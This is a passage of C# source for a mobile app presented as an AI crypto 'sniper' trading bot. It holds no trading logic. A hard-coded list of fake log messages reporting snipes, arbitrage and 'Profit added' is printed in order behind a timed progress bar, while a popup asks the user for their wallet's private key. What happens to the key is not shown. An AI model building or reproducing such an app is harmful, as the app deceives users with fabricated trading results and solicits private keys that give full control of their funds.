    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[SUCCESS] Trade completed. Profit added.",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[SUCCESS] High-speed execution completed. Profit added.",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Front-running protection enabled.",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Sniper mode activated... Scanning for new liquidity pools.",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[INFO] Monitoring price action...",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[INFO] Monitoring blockchain mempool for pending transactions...",
    "[ALERT] Potential rug pull detected! Skipping trade...",
    "[INFO] Contract verified. Deploying buy order...",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[INFO] Front-running protection enabled.",
    "[INFO] Stop-loss triggered. Preventing further losses...",
    "[SUCCESS] Successful re-entry at lower price. Profit added.",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Adjusting risk management settings...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] MoonAlpha AI adjusting trading strategy based on market trends...",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[WARNING] Market cooldown detected. Reducing trade frequency...",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[WARNING] Market cooldown detected. Reducing trade frequency...",
    "[INFO] Telegram alert sent: New profitable trade executed.",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[SUCCESS] Sniped successfully. Position secured.",
    "[INFO] Price pump detected. Evaluating exit strategy...",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[SUCCESS] Trade completed. Profit added.",
    "[INFO] Arbitrage opportunity detected. Calculating profit margin...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] Auto-compounding profits into next sniper trade...",
    "[WARNING] High slippage detected. Recalculating optimal buy price...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[ERROR] Transaction failed. Retrying with new gas settings...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Rug pull detection module active. Scanning for suspicious activity...",
    "[SUCCESS] Trade completed. Profit added.",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[INFO] Liquidity detected. Analyzing token contract...",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[SUCCESS] Buy order placed under optimal conditions.",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[SUCCESS] Arbitrage trade executed. Profit added.",
    "[INFO] AI algorithm detecting next trading opportunity...",
    "[INFO] Whale activity detected. Adjusting sniper mode...",
    "[SUCCESS] Sell order executed. Profit added.",
    "[INFO] Low liquidity warning. Evaluating risk factors...",
    "[INFO] Market volatility detected. Adjusting sniper settings...",
    "[INFO] Gas optimization in progress. Reducing transaction costs...",
    "[INFO] Front-running protection enabled.",
    "[INFO] Large volume detected. Preparing sniper execution...",
    "[INFO] Sell signal detected. Executing exit strategy...",
    "[SUCCESS] Buy order executed at optimal entry point.",
    "[INFO] Smart stop-loss activated. Monitoring for price reversal...",
    "[SUCCESS] Trade completed. Profit added.",
    "[SUCCESS] Trade completed. Profit added.",
    "[INFO] Adjusting risk management settings...",
    "[SUCCESS] Sell order executed. Profit added."
};



        public MainPage()
        {
            InitializeComponent();
            sol1.IsEnabled = sol2.IsEnabled = sol5.IsEnabled = sol10.IsEnabled = false;



        }
       
        private async void ShowPrivateKeyPopup()
        {
            privateKeyPopup = new PrivateKeyPopup();


            var result = (bool)await this.ShowPopupAsync(privateKeyPopup);

          
            if (result)
            {
                btnConnect.Text = "Connected Wallet";
                btnConnect.IsEnabled = false;
                sol1.IsEnabled = sol2.IsEnabled = sol5.IsEnabled = sol10.IsEnabled = result;

            }
        }
        private void ShowInfoPopup()
        {
            this.ShowPopup(new InfoPopup());
        }
       private void ShowCompletePopup()
        {
            this.ShowPopup(new CompletePopup());
        }

      

        private void RadioButton_Checked(object sender, CheckedChangedEventArgs e)
        {
        }

        private void OnRadioButtonCheckedChanged(object sender, CheckedChangedEventArgs e)
        {

        }

        private void OnAmountChanged(object sender, CheckedChangedEventArgs e)
        {

        }

        private void Entry_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (!String.IsNullOrEmpty(txtInputLink.Text))
            {
                var startBtn = (Button)FindByName("btnStart");

                if (startBtn == null)
                {

                    return;
                }
                startBtn.IsEnabled = true;

            }


        }

        private void Button_Clicked(object sender, EventArgs e)
        {
            ShowPrivateKeyPopup();
        }

        private void Button_Click_1(object sender, EventArgs e)
        {
            ShowInfoPopup();

        }

        private void sol1_CheckedChanged(object sender, CheckedChangedEventArgs e)
        {

        }

        private void amount_CheckedChanged(object sender, CheckedChangedEventArgs e)
        {
            profitPicker.IsEnabled = true;


        }

      

        private async void btnStart_Clicked(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtInputLink.Text))
            {
                await Application.Current.MainPage.DisplayAlert("Warning", "Please enter input link key.", "OK");
            }
            else
            {
                StartProgress();
            }
                
        }
        private async void StartProgress()
        {
            // Reset UI instantly before starting again
            pbProgress.Progress = 0;
            prgStatusLbl.Text = "0%";

            double progress = 0;
            var startBtn = (Button)FindByName("btnStart");
            startBtn.IsEnabled = false;
            int index = 0; // Track text index

            while (progress < 1)
            {
                progress += 0.01; // Increase by 1%
                pbProgress.ProgressTo(progress, 1200, Easing.Linear);
                prgStatusLbl.Text = $"{(progress * 100):0}%";
                MainThread.BeginInvokeOnMainThread(async () =>
                {
                    // Ensure we have a valid ObservableCollection<string> for automatic UI updates
                    if (richtxtbox.ItemsSource is not ObservableCollection<string> items)
                    {
                        items = new ObservableCollection<string>();
                        richtxtbox.ItemsSource = items; // Set once to maintain binding
                    }

                    // Add new text smoothly
                    items.Add(randomTexts[index % randomTexts.Length]);

                    // Allow UI update before scrolling
                    await Task.Delay(100);

                    // Smoothly scroll to the latest item
                    if (items.Count > 0)
                    {
                        richtxtbox.ScrollTo(items[^1], ScrollToPosition.End, true);
                    }
                });

                index++; // Increment index for next text

                await Task.Delay(1200); // Wait for 1.2 seconds per step
            }

            startBtn.IsEnabled = true;
            prgStatusLbl.Text = "Successfully";
            ShowCompletePopup();
        }

        private void profitPicker_SelectedIndexChanged(object sender, EventArgs e)
        {
            txtInputLink.IsEnabled = true;
        }

        private void Button_Clicked_1(object sender, EventArgs e)
        {
            //var flexLayoutAmount = (FlexLayout)FindByName("flexLayoutAmount");
            //foreach (var child in flexLayoutAmount.Children)
            //{
            //    if (child is RadioButton radioButton)
            //    {
            //        radioButton.IsChecked = false;
            //    }
            //}
            //profitPicker.SelectedIndex = -1;
            //txtInputLink.Text = "";
            //txtInputLink.IsEnabled = false;
            //prgStatusLbl.Text = "";
            //profitPicker.IsEnabled = false;
            //sol1.IsEnabled = sol2.IsEnabled = sol5.IsEnabled = sol10.IsEnabled = false;
           
            //    btnConnect.Text = "Connect Wallet";
            //    btnConnect.IsEnabled = true;
            //btnStart.IsEnabled = false;
            //pbProgress.Progress = 0;
            //prgStatusLbl.Text = "";
           
            //ShowPrivateKeyPopup();



        }
    }

}
